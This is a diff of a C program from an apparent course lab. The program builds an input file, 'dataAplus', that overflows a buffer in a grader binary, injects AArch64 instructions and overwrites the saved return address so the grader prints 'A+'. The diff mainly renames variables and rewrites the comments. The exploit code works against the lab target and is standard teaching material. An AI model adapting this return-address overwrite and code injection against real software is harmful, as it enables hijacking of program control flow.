@@ -1,137 +1,138 @@
 /*--------------------------------------------------------------------*/
 /* createdataAplus.c                                                  */
-/* Author: Anish K (Modified by [Your Name])                          */
+/* author: replaced_author                                             */
 /*--------------------------------------------------------------------*/
 
 /*
-  Produces a file called "dataAplus" that, when provided as input to 
-  the grader program, causes the grader to print "A+" instead of "D".
+  this program sets up a crafted input file named "dataAplus" that,
+  when passed into the vulnerable grader executable, tricks the grader
+  into printing "A+" rather than "D". we rely on a buffer overflow
+  scenario, placing both data and executable instructions where they
+  shouldn't be, effectively hijacking the control flow.
 
-  This is achieved by:
-  1. Writing a chosen name followed by a null terminator.
-  2. Overflowing the stack with padding bytes.
-  3. Injecting an 'A' character along with alignment bytes.
-  4. Writing machine instructions into memory (via the buffer overrun):
-     - Load and print 'A' using printf.
-     - Replace 'D' with '+' in the 'grade' variable.
-     - Branch back to the main function to finalize printing "A+".
-  5. Overwriting the return address to execute our injected instructions.
+  the key steps:
+  - write out a chosen identifier and end it with a null character.
+  - push beyond normal buffer boundaries with extra padding bytes.
+  - insert an 'A' character, followed by a few alignment nulls.
+  - embed instructions that load and print 'A', rewrite 'D' to '+' in
+    the grade variable, and jump back into the main routine's normal
+    flow.
+  - adjust the return pointer to ensure our code executes at runtime.
 */
 
 /*
-  Interactive behavior of main:
-  - Does not accept command-line arguments.
-  - Does not read from stdin or any other streams.
-  - Does not write to stdout or stderr.
-  - Writes crafted bytes into "dataAplus".
-  - Returns 0 on success.
+  runtime behavior:
+  - no arguments needed.
+  - does not read from stdin or any other input stream.
+  - it doesn't write anything to standard output or error.
+  - it solely writes a carefully engineered byte sequence into "dataAplus".
+  - upon completion, returns 0 if successful.
 */
 
 #include <stdio.h>
 #include <stdint.h>
 #include "miniassembler.h"
 
-/* Constants derived from analysis */
+/* constants extracted from analysis of the grader binary */
 enum {
-    NAME_LENGTH         = 9,       /* Length of "AnishKKat" without the null terminator */
-    NULL_TERM_COUNT     = 1,       /* One null terminator after the name */
-    PADDING_COUNT       = 10,      /* Number of '0' chars to overflow the stack */
-    ALIGN_COUNT         = 3,       /* Number of null bytes for alignment after 'A' */
-    A_CHAR_ADDR         = 0x42006c,/* Address in bss where 'A' will be located */
-    START_INSTR_ADDR    = 0x420070,/* Address where injected instructions begin */
-    PRINTF_ADDR         = 0x400690,/* Address of printf function */
-    GRADE_ADDR          = 0x420044,/* Address of 'grade' variable in data */
-    BRANCH_BACK_ADDR    = 0x40089c,/* Address in main to branch back to */
-    BL_INSTR_SHIFT      = 2,
-    BL_INSTR_MASK       = 0x03FFFFFF
+    LEN_USER_ALIAS      = 9,       /* length of "AnishKKat" without its trailing null */
+    CNT_NULL_TERM       = 1,       /* one null terminator to properly end the name */
+    CNT_OVERFLOW        = 10,      /* number of '0' bytes to surpass stack boundaries */
+    CNT_ALIGN_BYTES     = 3,       /* extra nulls for precise alignment after 'A' */
+    LOC_A_CHAR          = 0x42006c,/* memory address holding the 'A' character */
+    LOC_INSTR_START     = 0x420070,/* where our injected instructions will reside */
+    LOC_PRINTF          = 0x400690,/* entry point of the printf function */
+    LOC_GRADE           = 0x420044,/* address of the 'grade' variable in data segment */
+    LOC_BACK_MAIN       = 0x40089c,/* where we jump back in the main routine */
+    SHIFT_BL_INSTR      = 2,
+    MASK_BL_INSTR       = 0x03FFFFFF
 };
 
 /* 
-   Generates a BL (branch with link) instruction to call a function
-   at ulTargetAddr from the instruction at ulCurrentAddr.
+  this helper assembles a BL (branch-link) instruction that makes the pc jump
+  to a function at ulTargetAddr, saving a return link, assuming the current
+  instruction is at ulCurrentAddr. the offset is computed and placed within
+  a BL opcode template.
 */
-static unsigned int GenerateBL(unsigned long ulTargetAddr,
-                              unsigned long ulCurrentAddr) {
-    unsigned int uiInstr = 0x94000000;
-    unsigned int uiOffset = (unsigned int)((ulTargetAddr - ulCurrentAddr) >> BL_INSTR_SHIFT);
-    uiInstr |= (uiOffset & BL_INSTR_MASK);
-    return uiInstr;
+static unsigned int AssembleBranchLink(unsigned long ulTargetAddr,
+                                       unsigned long ulCurrentAddr) {
+    unsigned int uiEncoding = 0x94000000;
+    unsigned int uiOffset = (unsigned int)((ulTargetAddr - ulCurrentAddr) >> SHIFT_BL_INSTR);
+    uiEncoding |= (uiOffset & MASK_BL_INSTR);
+    return uiEncoding;
 }
 
 int main(void) {
-    /* The chosen name to be placed in the bss array. */
-    const char *pcName = "AnishKKat";
+    /* name inserted into the bss section, eventually manipulated by the grader */
+    const char *pszUserAlias = "AnishKKat";
 
-    /* Variables for file writing and instruction generation */
-    FILE *fp;
-    int i;
-    unsigned long ulNewReturnAddress;
-    unsigned int uiInstrAdrA, uiInstrCallPrintf;
-    unsigned int uiInstrMovPlus, uiInstrAdrGrade;
-    unsigned int uiInstrStrbPlus, uiInstrBranchBack;
+    /* variables and instructions for file output and code injection */
+    FILE *pFileHandle;
+    int counter;
+    unsigned long modifiedReturnAddr;
+    unsigned int instrLoadCharA, instrCallToPrintf;
+    unsigned int instrLoadPlusChar, instrLocateGrade;
+    unsigned int instrStorePlus, instrJumpBack;
 
-    /* Open "dataAplus" file for writing */
-    fp = fopen("dataAplus", "w");
-    if (!fp) return 1;
+    /* open the crafted payload file */
+    pFileHandle = fopen("dataAplus", "w");
+    if (!pFileHandle) return 1;
 
-    /* Write the chosen name followed by a null terminator */
-    fwrite(pcName, 1, NAME_LENGTH, fp);
-    fputc('\0', fp);
+    /* put the chosen alias plus its terminating null */
+    fwrite(pszUserAlias, 1, LEN_USER_ALIAS, pFileHandle);
+    fputc('\0', pFileHandle);
 
-    /* Write padding '0' characters to overflow the stack */
-    for (i = 0; i < PADDING_COUNT; i++) {
-        fputc('0', fp);
+    /* fill with '0' chars to overflow stack frames and reach critical data */
+    for (counter = 0; counter < CNT_OVERFLOW; counter++) {
+        fputc('0', pFileHandle);
     }
 
-    /* Write 'A' and alignment null bytes */
-    fputc('A', fp);
-    for (i = 0; i < ALIGN_COUNT; i++) {
-        fputc('\0', fp);
+    /* place 'A', which we'll print, followed by nulls for alignment */
+    fputc('A', pFileHandle);
+    for (counter = 0; counter < CNT_ALIGN_BYTES; counter++) {
+        fputc('\0', pFileHandle);
     }
 
     /*
-      Generate the necessary instructions:
-      1. Load the address of 'A' into x0 (ADR).
-      2. Branch with link to printf (BL).
-      3. Move '+' into w0 (MOV).
-      4. Load address of grade variable into x1 (ADR).
-      5. Store '+' at the grade variable (STRB).
-      6. Branch back to main's printing sequence (B).
+       now we build the custom instructions that will run after the overflow:
+       1. load the 'A' address into x0 so printf sees a string start.
+       2. branch-link to printf to print that 'A' char.
+       3. move the '+' character into w0, preparing for grade rewrite.
+       4. load the grade address into x1 so we know where to write '+'.
+       5. store '+' in place of 'D' at the grade address.
+       6. jump back into main as if nothing odd happened, now with 'A+' in place.
     */
 
-    /* ADR x0, A_CHAR_ADDR */
-    uiInstrAdrA       = MiniAssembler_adr(0, A_CHAR_ADDR, START_INSTR_ADDR);
+    /* load address of 'A' into x0 */
+    instrLoadCharA      = MiniAssembler_adr(0, LOC_A_CHAR, LOC_INSTR_START);
 
-    /* BL to printf at PRINTF_ADDR */
-    uiInstrCallPrintf = GenerateBL(PRINTF_ADDR, START_INSTR_ADDR + 4);
+    /* call printf with BL */
+    instrCallToPrintf   = AssembleBranchLink(LOC_PRINTF, LOC_INSTR_START + 4);
 
-    /* MOV w0, '+' */
-    uiInstrMovPlus    = MiniAssembler_mov(0, '+');
+    /* insert '+' into w0 */
+    instrLoadPlusChar   = MiniAssembler_mov(0, '+');
 
-    /* ADR x1, GRADE_ADDR */
-    uiInstrAdrGrade   = MiniAssembler_adr(1, GRADE_ADDR, START_INSTR_ADDR + 12);
+    /* obtain the grade variable address in x1 */
+    instrLocateGrade     = MiniAssembler_adr(1, LOC_GRADE, LOC_INSTR_START + 12);
 
-    /* STRB w0, [x1] */
-    uiInstrStrbPlus   = MiniAssembler_strb(0, 1);
+    /* store '+' byte into grade variable */
+    instrStorePlus       = MiniAssembler_strb(0, 1);
 
-    /* B BRANCH_BACK_ADDR */
-    uiInstrBranchBack = MiniAssembler_b(BRANCH_BACK_ADDR, START_INSTR_ADDR + 20);
+    /* jump back to the main code block */
+    instrJumpBack        = MiniAssembler_b(LOC_BACK_MAIN, LOC_INSTR_START + 20);
 
-    /*
-      Write out all the generated instructions in sequence.
-      The order is crucial to preserve the intended behavior.
-    */
-    fwrite(&uiInstrAdrA,       sizeof(unsigned int), 1, fp);
-    fwrite(&uiInstrCallPrintf, sizeof(unsigned int), 1, fp);
-    fwrite(&uiInstrMovPlus,    sizeof(unsigned int), 1, fp);
-    fwrite(&uiInstrAdrGrade,   sizeof(unsigned int), 1, fp);
-    fwrite(&uiInstrStrbPlus,   sizeof(unsigned int), 1, fp);
-    fwrite(&uiInstrBranchBack, sizeof(unsigned int), 1, fp);
+    /* write out the assembled instructions in the correct sequence */
+    fwrite(&instrLoadCharA,    sizeof(unsigned int), 1, pFileHandle);
+    fwrite(&instrCallToPrintf, sizeof(unsigned int), 1, pFileHandle);
+    fwrite(&instrLoadPlusChar, sizeof(unsigned int), 1, pFileHandle);
+    fwrite(&instrLocateGrade,  sizeof(unsigned int), 1, pFileHandle);
+    fwrite(&instrStorePlus,    sizeof(unsigned int), 1, pFileHandle);
+    fwrite(&instrJumpBack,     sizeof(unsigned int), 1, pFileHandle);
 
-    /* Overwrite the stored return address so execution jumps into our instructions */
-    ulNewReturnAddress = START_INSTR_ADDR;
-    fwrite(&ulNewReturnAddress, sizeof(unsigned long), 1, fp);
+    /* override the saved return pointer to divert execution into our code block */
+    modifiedReturnAddr = LOC_INSTR_START;
+    fwrite(&modifiedReturnAddr, sizeof(unsigned long), 1, pFileHandle);
 
-    fclose(fp);
+    fclose(pFileHandle);
     return 0;
 }
